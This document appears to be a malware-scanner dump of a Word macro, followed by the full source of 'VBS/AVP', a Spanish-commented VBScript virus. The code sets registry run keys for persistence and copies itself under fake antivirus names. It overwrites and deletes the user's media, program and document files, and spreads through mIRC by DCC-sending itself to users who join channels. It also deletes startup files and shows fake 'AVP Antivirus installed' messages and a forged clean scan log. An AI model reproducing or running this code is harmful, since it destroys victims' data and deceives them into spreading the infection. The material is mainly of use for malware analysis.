behavior.Chr: May attempt to obfuscate specific str
behavior.Hex Strings: Hex-encoded str were detected, may be used to obfuscate str
behavior.Run: May run an executable file or a system command
behavior.Shell: May run an executable file or a system command
behavior.WScript.Shell: May run an executable file or a system command
behavior.autoexec: Runs when the Word document is opened

docinfo.macro:
' VBS/AVP 
' By: VeNeZuElA DeMoN
' Dedicado A: Kuasanagui, HOKO, Zircov, Neodrako, XpLoad, Nerfix y Nemesizz
' Porfavor Q Esto No Cause Tantos Problemas Como El VBS/Chavez :)
Dim Rege					' Aqui Agrego 6 Lineas De Registro En Windows.
Set Rege = WScript.CreateObject("WScript.Shell")
Rege.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\VeNeZuElA DeMoN","C:\VeNeZuElA DeMoN.vbs"

Set Rege = WScript.CreateObject("WScript.Shell")
Rege.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Kaspersky Anti Virus �\","C:\Kaspersky Anti Virus �.vbs"

Set Rege = WScript.CreateObject("WScript.Shell")
Rege.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\MyWord","C:\MyWord.exe.vbs"

Set Rege = WScript.CreateObject("WScript.Shell")
Rege.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Win","C:\Win.ini.vbs"

Set Rege = WScript.CreateObject("WScript.Shell")
Rege.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Zonavirus","C:\AVP_Scrapt.exe.vbs"

Set Rege = WScript.CreateObject("WScript.Shell")
Rege.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\6667","C:\6667.bat.vbs"


' En Esta Parte Copio El Virus EN Diferentes Carpetas Con Diferentes Nombres

Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy("C:\Mis Documentos\AVP_System.vbs")
c.Copy("C:\Windows\Fonts\Verdana Antigua.dll.vbs")
c.Copy("C:\Windows\Regedit.ini.vbs")

' Este Es Un Payload Destructivo Del Virus 

On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="wav") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
fso.DeleteFile(f1.path)
elseif(ext="exe") or (ext="com") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
fso.DeleteFile(f1.path)
elseif(ext="bat") or (ext="dll") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
fso.DeleteFile(f1.path)
elseif(ext="ini") or (ext="ppt") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
fso.DeleteFile(f1.path)
elseif(ext="doc") or (ext="xls") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close

' Aqui Esta El Payload De Propagacion Del Virus Unicamente El Virus Se Propaga Por mIRC 

Dim ObjetoShell, ArchivoSistema, mIRC
Set ObjetoShell = CreateObject("WScript.shell")
Set ArchivoSistema = CreateObject("Scripting.FileSystemObject")
ObjetoShell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\" & Chr((100)+10+4) & "un\AVP","AVP.exe " & ArchivoSistema.GetSpecialFolder(0) & "\AVP.exe.vbs %"
ArchivoSistema.CopyFile wscript.scriptfullname, ArchivoSistema.GetSpecialFolder(0) & "\AVP.exe.vbs"

ObjetoShell.regwrite "HKCU\software\AVP", ""

If ObjetoShell.regread ("HKCU\software\AVP") <> "1" then

if ArchivoSistema.FolderExists("c:\mIRC") then

mIRC="c:\mIRC"
elseif ArchivoSistema.FolderExists("C:\program files\mirc") then
mIRC="C:\program files\mirc"
elseif ArchivoSistema.FolderExists("C:\archivos de programa\mirc") then
mIRC="C:\archivos de programa\mirc"
else
msgbox "Por Q No Tienes mIRC??"
End If

Dim fisyob
Set fisyob = CreateObject("Scripting.FileSystemObject")
Set f = fisyob.OpenTextFile(mIRC & "\" & Chr((100)+10+5) & Chr(90+(9)) & "ript.ini",2, True)
f.WriteLine "[Script]"
f.Write "n0=on 1:JOIN:#:if ( "
f.Write Chr((26)+5+5)
f.Write "me != "
f.Write Chr((26)+10)
f.Write "nick ) { /msg "
f.Write Chr((26)+10)
f.Write "Nick Baja Ya Gratis AVP Antivirus Que Esperas!!! | /"
f.Write "dcc send "
f.Write Chr((26)+5+5) & Chr((68)+4+6) & Chr((63)+3+7) & Chr((57)+2+8) & Chr ((65)+1+9)
f.Write " " & ArchivoSistema.GetSpecialFolder(0) & "\" & "AVP.exe.vbs }"

ObjetoShell.regwrite "HKCU\software\AVP", "1"
End if
end if

' Adivina Q Es Esto!

Set FSO = Wscript.CreateObject("Scripting.FileSystemObject")
Set WindowsFolder = FSO.GetSpecialFolder(0)
Set SystemFolder = FSO.GetSpecialFolder(1)
Set TempFolder = FSO.GetSpecialFolder(2)
FSO.CopyFile Wscript.ScriptFullName, TempFolder & "\AVP.exe", True
FSO.CopyFile Wscript.ScriptFullName, WindowsFolder & "\AVPIni.chm", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\AVP_Consol.EXE", True

FSO.CopyFile Wscript.ScriptFullName, WindowsFolder & "\AVP_VIRUS.exe", True


FSO.CopyFile Wscript.ScriptFullName, WindowsFolder & "\AVP_updater.exe", True

FSO.CopyFile Wscript.ScriptFullName, WindowsFolder & "\AVP Logs.txt", True


FSO.CopyFile Wscript.ScriptFullName, WindowsFolder & "\AVP_Page.exe", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\AVP_Command.com", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\AVP_K", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\AVP_%", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\AVP_S", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\AVP.bat", True

FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\Check AVP.html", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\The Kasperky", True



FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\AVP_PC.exe", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\AVP_SCan.exe", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\NAV_AVP.exe", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\PC-Cillin.exe", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\AVP_scanner.EXE", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\bitdefender.EXE", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\avprescue.exe", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\Panda_AntiVirus.exe", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\trend_antivirus.EXE", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\VeNeZuElA DeMoN.exe", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\HOKO.txt", True
FSO.CopyFile Wscript.ScriptFullName, SystemFolder & "\Kuasanagui.dll", True

' Esto Crea Un Archivo De Texto 

Set fso = CreateObject("Scripting.FileSystemObject")
Set tf = fso.CreateTextFile("c:\Windows\Si AVP Funsiona Mal Pinche Aqui.exe.txt", True)
tf.Write ("Si El AVP No Funsiona Correctamente Se Recomienda Reinstalar AVP Antivirus") 
tf.Write ("AVP Antivirus Una Produccion De: VeNeZuElA DeMoN") 
tf.Close


' Esto Crea Otro Archivo De Texto

Set fso = CreateObject("Scripting.FileSystemObject")
Set tf = fso.CreateTextFile("c:\Windows\V.D.txt", True)
tf.Write ("JaJaJaJaJa") 
tf.Write ("VeNeZuElA DeMoN Ataca Otra Vez!!") 
tf.Close

' Esto Crea Otro Archivo De Texto

Set fso = CreateObject("Scripting.FileSystemObject")
Set tf = fso.CreateTextFile("c:\Windows\AVP log.txt", True)
tf.Write ("El AVP No A Detectado Ningun Virus ") 
tf.Write ("Sistema: Estable ")
tf.Write ("Conexion: Si ")  
tf.Write ("Producto: AVP Antivirus")
tf.Write ("Recomendaciones: Actualizar El AVP Diariamente")    
tf.Close

' Esto Ve Si Existe winstart Si Lo Encuentra Lo Borra

if ArchivoSistema.FileExists("C:\Windows\winstart.bat") then

winstart"c:\Windows\winstart.bat"
elseif ArchivoSistema.FolderExists("C:\Windows\winstart.bat") then
else
Set fso = CreateObject("Scripting.FileSystemObject")
Set f1 = fso.GetFile("C:\Windows\winstart.bat")
f1.Delete
End If

' Aqui Borra autoexe Esto No Es Para Windows XP Ya Que En Windows XP El autoexec Esta en C:/Rescue

Set fldr = fso.DeleteFolder("C:\autoexec.bat")

MsgBox " Desea Instalar AVP Antivirus?", vbYesNo, "AVP"
MsgBox " AVP Antivirus Se A Instalado Con Exito!", "AVP"
MsgBox " Gracias Por Escojernos Como Su Antivirus!", "Gracias!..."

a.Run "http://www.avp-es.com", 6, False
